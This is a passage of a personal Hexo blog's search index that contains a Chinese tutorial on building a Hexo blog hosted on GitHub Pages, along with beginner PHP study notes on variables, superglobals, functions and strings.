        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>layout</title>
      <link href="2021/03/12/layout/"/>
      <url>2021/03/12/layout/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hexo</title>
      <link href="2021/03/12/Hexo/"/>
      <url>2021/03/12/Hexo/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2021/03/12/hello-world/"/>
      <url>2021/03/12/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo + github 个人博客搭建</title>
      <link href="2021/03/12/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>2021/03/12/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="会使用到的工具"><a href="#会使用到的工具" class="headerlink" title="会使用到的工具"></a>会使用到的工具</h2><ul><li><p>node.js</p></li><li><p>sublime</p></li><li><p>git</p></li></ul><h3 id="node-js"><a href="#node-js" class="headerlink" title="node.js"></a>node.js</h3><h4 id="下载和安装"><a href="#下载和安装" class="headerlink" title="下载和安装"></a>下载和安装</h4><p>首先我们首先在node.js的<a href="https://nodejs.org/zh-cn/download/">官网</a>下载</p><p><img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/01/25/sqHuC9.png" alt="1"></p><p>使用其他平台的用户可根据自己的需求下载哦（图片为Windows平台）</p><p>下载完成后，一路next就能安装成功。</p><h4 id="检查安装情况"><a href="#检查安装情况" class="headerlink" title="检查安装情况"></a>检查安装情况</h4><ul><li><strong>node.js</strong></li></ul><p>打开Windows 命令处理程序输入node -v</p><p><img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/01/25/sqHm4J.png" alt="2"></p><p>出现版本号即为安装成功</p><ul><li><strong>npm</strong></li></ul><p>继续在Windows 命令处理程序输入npm -v</p><p><img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/01/25/sqHABT.png" alt="3"></p><p>出现版本号即为安装成功</p><h3 id="sublime"><a href="#sublime" class="headerlink" title="sublime"></a>sublime</h3><p>直接到<a href="http://www.sublimetext.com/3">sublime官网</a>下载。建议安装在与博客文件同一文件夹中。</p><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><h4 id="下载和安装-1"><a href="#下载和安装-1" class="headerlink" title="下载和安装"></a>下载和安装</h4><ul><li><p><strong>下载</strong></p><p>下载git可直接去git**<a href="">官网</a>**下载。进入官网后点击download。</p><p><img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/01/25/sqHMg1.png" alt="4"></p></li><li><p><strong>安装</strong></p></li></ul><ol><li><p>下载完成后打开进入此界面（因为我已经安装过git所以图中下面会多显示Only show new options ）</p><p><img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/01/25/sqHQjx.png" alt="5"></p></li><li><p>安装路径——选择自己想安装的位置就行。</p></li><li><p>安装git组件，图中框起来的为默认选中的组件，根据自己的需求勾选好后，选择下一步。</p><p><img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/01/25/sqH1u6.png" alt="6"></p></li><li><p>菜单文件夹，直接选择默认就行。</p></li><li><p>选择git的默认编辑器</p><p><img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/01/25/sqH3DK.png" alt="7"></p></li><li><p>选择仓库的初始名称。</p><p><img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/01/25/sqH8HO.png" alt="8"></p></li><li><p>修改系统的环境变量</p><p><img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/01/25/sqHYUe.png" alt="9"></p></li><li><p>SSL的证书选择</p><p><img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/01/25/sqHt4H.png" alt="10"></p></li><li><p>配置行尾结束符，默认为unix格式，可根据自己的情况选择</p><p><img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/01/25/sqHUCd.png" alt="11"></p></li><li><p>配置终端仿真，建议第一个</p><p><img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/01/25/sqHa8A.png" alt="12"></p></li><li><p>其他配置，默认即可。</p></li><li><p>安装完成后点击鼠标右键会出现<strong>Git GUI Here</strong>和<strong>Git Bash Here</strong>两个选项</p><p><img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/01/25/sqHwvt.png" alt="13"></p></li></ol><h2 id="Hexo-安装"><a href="#Hexo-安装" class="headerlink" title="Hexo 安装"></a>Hexo 安装</h2><p>在自己想安装hexo的位置新建一个叫blog的文件夹。创建完成后使用Windows命令窗口进入blog的文件夹中。</p><p>使用npm命令安装hexo，输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/01/25/sqHdgI.png" alt="14"></p><p>安装完成后再输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init blog  &#x2F;&#x2F;blog可替换成你想要的名字</span><br></pre></td></tr></table></figure><p>进行初始化</p><p>​    <img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/01/25/sqHBKP.png" alt="15"></p><p>出现 Start blogging with Hexo！即为成功。</p><p>进入第二个一创建好的blog文件夹，按顺序输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo new hello Hexo&#x2F;&#x2F;新建一篇名为“hello Hexo”的博客</span><br><span class="line">hexo g&#x2F;&#x2F;生成静态文件</span><br><span class="line">hexo s&#x2F;&#x2F;本地部署预览</span><br></pre></td></tr></table></figure><p>完成后输入localhost:4000可进行本地访问。</p><p><img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/01/25/sqHJED.png" alt="16"></p><h2 id="部署到GitHub"><a href="#部署到GitHub" class="headerlink" title="部署到GitHub"></a>部署到GitHub</h2><h3 id="GitHub仓库创建"><a href="#GitHub仓库创建" class="headerlink" title="GitHub仓库创建"></a>GitHub仓库创建</h3><p>首先要有一个GitHub的账号。</p><p>登录后点击左上角的new，创建新的仓库。进入仓库后输入仓库名称，必须要与owner下的名称一致，输入完成后即可（因为我之前已经创建过了仓库，所以提示）</p><p>​    <img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/01/25/sqHK3R.png" alt="17"></p><h3 id="GitHubSSH配置"><a href="#GitHubSSH配置" class="headerlink" title="GitHubSSH配置"></a>GitHubSSH配置</h3><p>打开git bash输入如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git config –global user.email “xxx@qq.com“ &#x2F;&#x2F;填写注册github的邮箱</span><br><span class="line"></span><br><span class="line">git config –global user.name “xxxx” &#x2F;&#x2F;github 用户名</span><br><span class="line"></span><br><span class="line">ssh-keygen &#x2F;&#x2F;输入完这个就一致enter就行了</span><br></pre></td></tr></table></figure><p>完成后进入用户目录下的.ssh文件夹，打开id_rsa.pub，复制里面的内容。</p><p>进入GitHub，鼠标移动到右上角头像处，点击settings，之后再点击左边 SSH and GPG keys。创建一个新的SSH即可。</p><h3 id="Hexo与GitHub连接"><a href="#Hexo与GitHub连接" class="headerlink" title="Hexo与GitHub连接"></a>Hexo与GitHub连接</h3><p>在站点文件夹中打开_config.yml，将Deployment改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https:&#x2F;&#x2F;github.com&#x2F;yui1111&#x2F;yui1111.github.io.git &#x2F;&#x2F;改为自己GitHub中的https链接</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/01/25/sqLBK1.png" alt="18"></p><p>将”url”后改为“<a href="https://github项目名&quot;/">https://github项目名&quot;</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># URL</span><br><span class="line">## If your site is put in a subdirectory, set url as &#39;http:&#x2F;&#x2F;example.com&#x2F;child&#39; and root as &#39;&#x2F;child&#x2F;&#39;</span><br><span class="line">url: https:&#x2F;&#x2F;yui1111.github.io &#x2F;&#x2F;改这个</span><br><span class="line">root: &#x2F;</span><br><span class="line">permalink: :year&#x2F;:month&#x2F;:day&#x2F;:title&#x2F;</span><br><span class="line">permalink_defaults:</span><br><span class="line">pretty_urls:</span><br><span class="line">  trailing_index: true # Set to false to remove trailing &#39;index.html&#39; from permalinks</span><br><span class="line">  trailing_html: true # Set to false to remove trailing &#39;.html&#39; from permalinks</span><br></pre></td></tr></table></figure><p>安装插件，上传博客</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br><span class="line">git config --global user.email &quot;github邮箱&quot;</span><br><span class="line">git config --global user.name &quot;github用户名&quot;</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>输入网址如<a href="https://yui1111.github.io后等待一会即可进入./">https://yui1111.github.io后等待一会即可进入。</a></p><p>至此搭建过程结束。</p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习记录</title>
      <link href="2021/01/25/PHP1/"/>
      <url>2021/01/25/PHP1/</url>
      
        <content type="html"><![CDATA[<h1 id="变量命名规则"><a href="#变量命名规则" class="headerlink" title="变量命名规则"></a>变量命名规则</h1><ol><li> <strong>在PHP中变量名字必须以 “$” 符号开始；</strong></li><li> 名字由字母、数字和下划线 “_” 构成，但是不能以数字开头；（与C相似） </li><li> 在PHP中本身呢个允许中文变量；</li></ol><h1 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h1><p>定义：提前定义的变量，系统定义的变量，存储许多需要用到的数据<strong>（预定义变量都是数组）</strong></p><p><strong>$_GET: 获取所有表单以 get 方式提交的数据</strong></p><p><strong>$_POST: POST 提交的数据都会保存于此</strong></p><p><strong>$_REQUEST: GET 和 POST 提交的都会保存</strong></p><p>$GLOBALS: PHP 中所有的全局变量</p><p><strong>$_SERVER: 服务器信息</strong></p><p><strong>$_SESSION: session 会话数据</strong></p><p><strong>$_COOKIE: cookie 会话数据</strong></p><p>$_ENV: 环境信息</p><p>$_FILES: 用户上传的文件信息</p><h1 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h1><p>定义：如果一个变量保存的值刚好是另一个变量的名字，那么可以直接通过访问一个变量的到另一个变量的值：在变量前面多加一个$符号。</p><h1 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h1><p>使用echo输出需要连接是需加 “ . ” 才能连接。如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pp</span> =<span class="string">&#x27;China&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$pp</span>  <span class="string">&#x27; is good&#x27;</span><span class="string">&#x27;.&#x27;</span>;</span><br></pre></td></tr></table></figure><p>保存后打开浏览器提示错误。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pp</span> =<span class="string">&#x27;China&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$pp</span> . <span class="string">&#x27; is good&#x27;</span> . <span class="string">&#x27;.&#x27;</span>;</span><br></pre></td></tr></table></figure><p>加入 “ . “ 后正确输出 “China is good.”这句话。</p><h1 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h1><p>PHP中换行代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;    <span class="comment">//只换行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;<span class="comment">//换行加分隔线</span></span><br></pre></td></tr></table></figure><h1 id="PHP魔术变量"><a href="#PHP魔术变量" class="headerlink" title="PHP魔术变量"></a>PHP魔术变量</h1><p>PHP 向它运行的任何脚本提供了大量的预定义常量。</p><p>不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。</p><p>有八个魔术常量它们的值随着它们在代码中的位置改变而改变。</p><p>具体见菜鸟教程中**<a href="https://www.runoob.com/php/php-magic-constant.html">PHP魔术变量</a>**。</p><p>字符串文 0 是转换为布尔值的特殊情况，它转换为 false。</p><p>当使用 POST 方法时，变量不会显示在 URL 中，只有 GET 才会。</p><h1 id="PHP超级全局变量"><a href="#PHP超级全局变量" class="headerlink" title="PHP超级全局变量"></a>PHP超级全局变量</h1><p>PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。</p><p>PHP 超级全局变量列表:</p><ul><li>$GLOBALS</li><li>$_SERVER</li><li>$_REQUEST</li><li>$_POST</li><li>$_GET</li><li>$_FILES</li><li>$_ENV</li><li>$_COOKIE</li><li>$_SESSION</li></ul><h2 id="PHP-GLOBALS"><a href="#PHP-GLOBALS" class="headerlink" title="PHP $GLOBALS"></a>PHP $GLOBALS</h2><p>$GLOBALS 是PHP的一个超级全局变量组，在一个PHP脚本的全部作用域中都可以访问。</p><p>$GLOBALS 是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$x</span> = <span class="number">75</span>; </span><br><span class="line"><span class="variable">$y</span> = <span class="number">25</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addition</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$GLOBALS</span>[<span class="string">&#x27;z&#x27;</span>] = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;x&#x27;</span>] + <span class="variable">$GLOBALS</span>[<span class="string">&#x27;y&#x27;</span>]; </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">addition(); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$z</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其余的见<a href="https://www.runoob.com/php/php-superglobals.html"><strong>菜鸟教程</strong></a></p><h1 id="PHP常用系统函数"><a href="#PHP常用系统函数" class="headerlink" title="PHP常用系统函数"></a>PHP常用系统函数</h1><h3 id="有关输出的函数"><a href="#有关输出的函数" class="headerlink" title="有关输出的函数"></a>有关输出的函数</h3><p>**print()**：类似于 echo 输出提供的内容，本质是一种结构（不是函数），返回1，可以不需要使用括号。</p><p>**print_r()**：类似于var_dump，但是比 var_dump 简单，不会输出数据类型，只会输出值（数组打印比较多）</p><h2 id="有关时间的函数"><a href="#有关时间的函数" class="headerlink" title="有关时间的函数"></a>有关时间的函数</h2><p>**date()**：按照指定格式对应的时间戳（从1970年格林威治时间开始计算的秒数），如果没有指定的时间戳，那么就是默认解释当前时间戳。—— string date（string $format [, int $timestamp] ）</p><p>**time()**：获取当前时间对应的时间戳(返回自从Unix纪元到当前时间的秒数) —— int  time(void)</p><p>**microtime()**：获取微秒级别的时间 —— mixed microtime([bool $get_as_float ] )</p><p>**strtotime()**：按照规定格式的字符串转换成时间戳——int strtotime( string $time [, int $now] )</p><h2 id="有关数学的函数"><a href="#有关数学的函数" class="headerlink" title="有关数学的函数"></a>有关数学的函数</h2><ol><li>max()</li><li>min()</li><li>**rand()**：得到一个随机数，指定区间的随机整数—— int rand ([int $min ] , int $max )</li></ol><p>列如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> rand() . <span class="string">&quot;\n&quot;</span>;    <span class="comment">//7771</span></span><br><span class="line"><span class="keyword">echo</span> rand() . <span class="string">&quot;\n&quot;</span>;   <span class="comment">//22264</span></span><br><span class="line"><span class="keyword">echo</span> rand(<span class="number">5</span> , <span class="number">15</span>);     <span class="comment">//11</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="4"><li><strong>mt_rand()<strong>：与rand一样，只是底层结构不同</strong>效率更高</strong></li><li>round()：四舍五入</li><li>ceil()：向上取整</li><li>floor()：向下取整</li><li>pow()</li><li>abs()</li><li>sqrt()</li></ol><h2 id="有关函数的函数"><a href="#有关函数的函数" class="headerlink" title="有关函数的函数"></a>有关函数的函数</h2><ol><li>function_exists()：半段指定的函数名字是否在内存中（帮助用户不去使用一个不存在的函数，让代码安全性更高）</li><li>func_get_arg()：在自定义函数中去后去指定数值对应的参数</li><li>func_get_args()：在自定义函数中获取所有的参数（数组）</li><li>func_num_args()：获取当前自定怀疑函数的参数数量</li></ol><p>列如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//获取指定参数</span></span><br><span class="line">    var_dump(func_get_arg(<span class="number">1</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取所有参数</span></span><br><span class="line">    var_dump(func_get_args());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取参数数量</span></span><br><span class="line">    var_dump(func_num_args());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用函数</span></span><br><span class="line">function_exists(<span class="string">&#x27;test&#x27;</span>) &amp;&amp; test(<span class="number">1</span>,<span class="string">&#x27;2&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">string(1) &quot;2&quot;</span><br><span class="line">array(4) &#123;</span><br><span class="line">[0]&#x3D;&gt;int(1)</span><br><span class="line">[1]&#x3D;&gt;string(1) &quot;2&quot;</span><br><span class="line">[2]&#x3D;&gt;int(3)</span><br><span class="line">[3]&#x3D;&gt;int(4)</span><br><span class="line">&#125;</span><br><span class="line">int(4)</span><br></pre></td></tr></table></figure><h1 id="文件加载路径"><a href="#文件加载路径" class="headerlink" title="文件加载路径"></a>文件加载路径</h1><p>文件的加载路径包含两大类：</p><ol><li><p>绝对路径</p><p>从词牌的根目录开始（本地绝对路径）</p><p>如Windows：盘符C:/路径/PHP 文件</p><p>Linux：/路径/PHP 文件</p><p>从网站根目录开始（网络绝对路径）</p><p>/：相对于网络主机名字对应的路径</p><p>localhost/index.php -&gt; E:/server/apache/htdocs/index.php</p></li><li><p>相对路径：从当前文件所在目录开始的路径</p><p>. | ./：表示当前文件夹</p><p>../：上级目录（当前文件夹的上一层文件夹）</p></li></ol><p>绝对路径和相对路径的区别</p><ol><li>绝对路径相对效率偏低，但是相对安全（路径不会出问题）</li><li>相对路径相对效率高些，但是容易出错（相对路径会发生改变）</li></ol><h1 id="global关键字"><a href="#global关键字" class="headerlink" title="global关键字"></a>global关键字</h1><p>在 PHP 中，有一种方法，能够实现全局访问局部，同时局部也能访问全局：global关键字。</p><p>global关键字：是一种在函数里面定义变量的一种方式</p><ol><li><p>如果使用global定义的变量名在外部存在（全局变量），那么系统在函数内部定义的变量直接指向外部全局变量所指向的内存空间（同一个变量）；</p></li><li><p>如果使用global啊定义的变量名在外部不存在（全局变量），系统会自动在全局空间（外部）定义一个与全局变量同名的全局变量。</p></li></ol><p>本质的形式：在函数的内部和外部，对一个同名的变量（全局和局部）使用同一块内存地址保存数据，从而实现共同拥有。</p><p>基本语法：</p><p>global  变量名    //不能赋值</p><p>变量名  =  值       //修改</p><p><strong>但不推荐使用</strong></p><h1 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h1><p>静态变量：static，是在函数内部定义的变量，使用 static 关键字修饰，用来实现跨函数共享数据的变量（函数运行结束后局部变量会清空，重新运行函数，所有的局部变量又会重新初始化）。</p><p>基本语法：</p><p><strong>function 函数名(){</strong></p><p>​        <strong>//定义变量</strong></p><p>​        <strong>static $变量名 = 值;</strong></p><p><strong>}</strong></p><p>静态变量的使用：</p><ol><li>为了统计：当前函数被调用的次数</li><li>为了统筹函数多次调用得到的不同结果</li></ol><h1 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h1><p>可变函数：当前有一个变量所保存得到的值，刚好是一个函数的名字，那么就可以使用变量+()来充当函数名使用。</p><p><strong>$变量 = ‘display’</strong></p><p><strong>function display(){</strong></p><p>…</p><p><strong>}</strong></p><p><strong>// 可变函数</strong></p><p><strong>$变量</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__LINE__</span> , <span class="keyword">__FUNCTION__</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;display&#x27;</span>;</span><br><span class="line"><span class="variable">$func</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>适用范围：可变函数在系统使用的过程中还是比较多的，尤其是使用很多系统函数的时候：选哟用户在外部定义一个自定义函数，但是是需要传入到系统内部使用的。</p><h1 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h1><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>匿名函数：没有名字的函数</p><p>基本语法：</p><p>变量名 = function(){</p><p>​    函数体</p><p>};</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//调用匿名函数</span></span><br><span class="line"><span class="variable">$func</span>();</span><br></pre></td></tr></table></figure><p>变量保存匿名函数，本质得到的是一个对象（Closure）</p><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>闭包：closure，一词来源于以下两者结合：要执行的代码块（由于自由变量被包含在代码块中，这些自由变量以及他们引用的对象没有被释放）和为自由变量提供绑定的计算环境（作用域）</p><p>简单理解：函数内部有一些局部变量（徐要执行的代码块）在函数执行之后没有被释放，是应为在函数内部还有对应的函数在引用（函数的内部函数：匿名函数）</p><h1 id="字符串转义"><a href="#字符串转义" class="headerlink" title="字符串转义"></a>字符串转义</h1><h2 id="双引号中变量识别的规则"><a href="#双引号中变量识别的规则" class="headerlink" title="双引号中变量识别的规则"></a>双引号中变量识别的规则</h2><ol><li>变量本身系统能够与后面的内容区分：应保证变量的独立性，不要让系统难以区分</li><li>使用变量标识符区分——给变量加上一组大括号{}</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="comment">//变量识别</span></span><br><span class="line"><span class="variable">$str1</span> = <span class="string">&#x27;abce $a dfg&#x27;</span>;<span class="comment">//输出：abce $a dfg</span></span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&quot;abce <span class="subst">$a</span> dfg&quot;</span>;<span class="comment">//输出：abce hello dfg</span></span><br><span class="line"><span class="variable">$str3</span> = <span class="string">&quot;abce<span class="subst">$adfg</span>&quot;</span>;<span class="comment">//error</span></span><br><span class="line"><span class="variable">$str4</span> = <span class="string">&quot;abce<span class="subst">&#123;$a&#125;</span>dfg&quot;</span><span class="comment">//输出：abcehellodfg</span></span><br></pre></td></tr></table></figure><h1 id="数组定义语法"><a href="#数组定义语法" class="headerlink" title="数组定义语法"></a>数组定义语法</h1><ol><li><p>使用 array 关键字（最常用）：</p><p>$变量 = array(元素1 ， 元素2 ， …)；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr1</span> = <span class="keyword">array</span>(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">var_dump(<span class="variable">$arr1</span>);</span><br></pre></td></tr></table></figure><p>结果为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;1&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">int</span>(<span class="number">2</span>) [<span class="number">2</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span 